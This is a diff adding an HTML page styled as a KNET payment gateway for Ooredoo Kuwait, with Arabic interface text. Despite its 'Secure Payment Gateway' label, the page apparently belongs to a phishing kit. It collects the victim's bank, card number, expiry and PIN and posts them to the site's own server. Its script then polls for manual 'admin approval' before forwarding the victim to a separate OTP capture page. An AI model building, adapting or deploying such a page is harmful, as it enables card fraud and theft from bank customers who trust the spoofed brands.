@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KNET Payment - أوريدو</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 100%;
+            padding: 30px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 100px;
+            height: 60px;
+            margin: 0 auto 15px;
+            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
+            border-radius: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .form-section {
+            margin-bottom: 25px;
+        }
+
+        .form-section.hidden {
+            display: none;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #333;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #f0f0f0;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        select, input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+            font-family: Arial, sans-serif;
+        }
+
+        select:focus, input:focus {
+            outline: none;
+            border-color: #0066cc;
+            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.1);
+        }
+
+        .info-box {
+            background: #f9f9f9;
+            border-right: 4px solid #0066cc;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        .info-box strong {
+            display: block;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .loading-container {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .loading-container.active {
+            display: block;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #0066cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .loading-subtext {
+            font-size: 13px;
+            color: #999;
+        }
+
+        .error-message {
+            background: #fee;
+            border: 1px solid #fcc;
+            border-right: 4px solid #dc2626;
+            color: #991b1b;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            display: none;
+        }
+
+        .error-message.active {
+            display: block;
+        }
+
+        .button-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 25px;
+        }
+
+        button {
+            padding: 12px 20px;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-cancel {
+            background: #f0f0f0;
+            color: #333;
+        }
+
+        .btn-cancel:hover {
+            background: #e0e0e0;
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #0066cc 0%, #0052a3 100%);
+            color: white;
+            grid-column: 1 / -1;
+        }
+
+        .btn-submit:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 102, 204, 0.4);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .summary {
+            background: #f9f9f9;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+
+        .summary-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .summary-label {
+            color: #666;
+        }
+
+        .summary-value {
+            color: #333;
+            font-weight: 600;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+
+            .button-group {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">KNET</div>
+            <div class="title">KNET Payment</div>
+            <div class="subtitle">Secure Payment Gateway</div>
+        </div>
+
+        <div class="summary">
+            <div class="summary-row">
+                <span class="summary-label">Merchant:</span>
+                <span class="summary-value">Ooredoo Kuwait</span>
+            </div>
+            <div class="summary-row">
+                <span class="summary-label">Amount:</span>
+                <span class="summary-value" id="amountDisplay">KD 5.000</span>
+            </div>
+            <div class="summary-row">
+                <span class="summary-label">Reference:</span>
+                <span class="summary-value" id="referenceDisplay">76678876</span>
+            </div>
+        </div>
+
+        <div id="errorMessage" class="error-message"></div>
+
+        <!-- Form Section -->
+        <div id="formSection" class="form-section active">
+            <div class="section-title">Select Your Bank *</div>
+
+            <div class="form-group">
+                <label for="bank">Bank</label>
+                <select id="bank" required>
+                    <option value="">-- Select Bank --</option>
+                    <option value="NBK">National Bank of Kuwait</option>
+                    <option value="CBK">Commercial Bank of Kuwait</option>
+                    <option value="FAB">First Abu Dhabi Bank</option>
+                    <option value="GIB">Gulf International Bank</option>
+                    <option value="KIB">Kuwait International Bank</option>
+                    <option value="BK">Burgan Bank</option>
+                    <option value="AUB">Al Ahli Bank of Kuwait</option>
+                    <option value="WARBA">Warba Bank</option>
+                    <option value="BOUBYAN">Boubyan Bank</option>
+                    <option value="KUWAIT">Kuwait Finance House</option>
+                </select>
+            </div>
+
+            <div class="section-title">Card Prefix *</div>
+
+            <div class="form-group">
+                <label for="cardPrefix">Card Prefix</label>
+                <select id="cardPrefix" required>
+                    <option value="">-- Select Prefix --</option>
+                    <option value="4">Visa (4)</option>
+                    <option value="5">MasterCard (5)</option>
+                    <option value="6">Discover (6)</option>
+                </select>
+            </div>
+
+            <div class="section-title">Debit Card Number *</div>
+
+            <div class="form-group">
+                <input type="text" id="cardNumber" placeholder="Enter 10-digit card number" maxlength="10" required>
+            </div>
+
+            <div class="section-title">Expiry Month *</div>
+
+            <div class="form-group">
+                <select id="expiryMonth" required>
+                    <option value="">MM</option>
+                    <option value="01">01</option>
+                    <option value="02">02</option>
+                    <option value="03">03</option>
+                    <option value="04">04</option>
+                    <option value="05">05</option>
+                    <option value="06">06</option>
+                    <option value="07">07</option>
+                    <option value="08">08</option>
+                    <option value="09">09</option>
+                    <option value="10">10</option>
+                    <option value="11">11</option>
+                    <option value="12">12</option>
+                </select>
+            </div>
+
+            <div class="section-title">Expiry Year *</div>
+
+            <div class="form-group">
+                <select id="expiryYear" required>
+                    <option value="">YYYY</option>
+                    <option value="2026">2026</option>
+                    <option value="2027">2027</option>
+                    <option value="2028">2028</option>
+                    <option value="2029">2029</option>
+                    <option value="2030">2030</option>
+                </select>
+            </div>
+
+            <div class="section-title">PIN (4 digits) *</div>
+
+            <div class="form-group">
+                <input type="password" id="pin" placeholder="Enter 4-digit PIN" maxlength="4" required>
+            </div>
+
+            <div class="button-group">
+                <button class="btn-cancel" onclick="handleCancel()">Cancel</button>
+                <button class="btn-submit" onclick="handleSubmit()">Submit Payment</button>
+            </div>
+        </div>
+
+        <!-- Loading Section -->
+        <div id="loadingSection" class="loading-container">
+            <div class="spinner"></div>
+            <div class="loading-text">جاري معالجة الدفع</div>
+            <div class="loading-subtext">يرجى الانتظار بينما نتحقق من معلومات البطاقة...</div>
+        </div>
+    </div>
+
+    <script>
+        let transactionId = null;
+        let pollingInterval = null;
+
+        // Get transaction ID from URL or localStorage
+        function initializeTransaction() {
+            const urlParams = new URLSearchParams(window.location.search);
+            transactionId = urlParams.get('id') || localStorage.getItem('currentTransactionId');
+            
+            if (!transactionId) {
+                transactionId = 'TRX' + Date.now();
+                localStorage.setItem('currentTransactionId', transactionId);
+            }
+
+            // Get amount from URL or localStorage
+            const amount = urlParams.get('amount') || localStorage.getItem('paymentAmount') || 'KD 5.000';
+            document.getElementById('amountDisplay').textContent = amount;
+            document.getElementById('referenceDisplay').textContent = transactionId.substring(3);
+        }
+
+        function handleCancel() {
+            if (confirm('هل تريد إلغاء العملية؟')) {
+                window.location.href = '/myooredoo/index.html';
+            }
+        }
+
+        async function handleSubmit() {
+            const bank = document.getElementById('bank').value;
+            const cardPrefix = document.getElementById('cardPrefix').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryMonth = document.getElementById('expiryMonth').value;
+            const expiryYear = document.getElementById('expiryYear').value;
+            const pin = document.getElementById('pin').value;
+
+            // Validation
+            if (!bank || !cardPrefix || !cardNumber || !expiryMonth || !expiryYear || !pin) {
+                showError('يرجى ملء جميع الحقول المطلوبة');
+                return;
+            }
+
+            if (cardNumber.length !== 10) {
+                showError('رقم البطاقة يجب أن يكون 10 أرقام');
+                return;
+            }
+
+            if (pin.length !== 4) {
+                showError('الرمز السري يجب أن يكون 4 أرقام');
+                return;
+            }
+
+            // Hide form and show loading
+            document.getElementById('formSection').classList.remove('active');
+            document.getElementById('loadingSection').classList.add('active');
+            clearError();
+
+            try {
+                // Submit KNET data to server
+                const response = await fetch(`/api/payment/${transactionId}/knet`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        bank,
+                        cardPrefix,
+                        cardNumber,
+                        expiryMonth,
+                        expiryYear,
+                        pin
+                    })
+                });
+
+                if (!response.ok) throw new Error('Failed to submit KNET data');
+
+                // Start polling for admin approval
+                startPolling();
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('formSection').classList.add('active');
+                document.getElementById('loadingSection').classList.remove('active');
+                showError('حدث خطأ في معالجة الطلب. يرجى المحاولة مرة أخرى.');
+            }
+        }
+
+        function startPolling() {
+            pollingInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`/api/payment/${transactionId}/status`);
+                    if (!response.ok) throw new Error('Failed to fetch status');
+
+                    const data = await response.json();
+
+                    if (data.knetApproved === true) {
+                        // KNET approved, move to OTP
+                        clearInterval(pollingInterval);
+                        localStorage.setItem('currentTransactionId', transactionId);
+                        window.location.href = `/myooredoo/otp-realtime.html?id=${transactionId}`;
+                    } else if (data.knetApproved === false) {
+                        // KNET rejected
+                        clearInterval(pollingInterval);
+                        document.getElementById('loadingSection').classList.remove('active');
+                        document.getElementById('formSection').classList.add('active');
+                        showError('برجاء التحقق من معلومات البطاقة الصحيحة');
+                    }
+                } catch (error) {
+                    console.error('Polling error:', error);
+                }
+            }, 1000); // Poll every 1 second
+        }
+
+        function showError(message) {
+            const errorDiv = document.getElementById('errorMessage');
+            errorDiv.textContent = message;
+            errorDiv.classList.add('active');
+        }
+
+        function clearError() {
+            document.getElementById('errorMessage').classList.remove('active');
+        }
+
+        // Initialize on page load
+        window.addEventListener('load', initializeTransaction);
+
+        // Clean up polling on page unload
+        window.addEventListener('beforeunload', () => {
+            if (pollingInterval) clearInterval(pollingInterval);
+        });
+    </script>
+</body>
+</html>
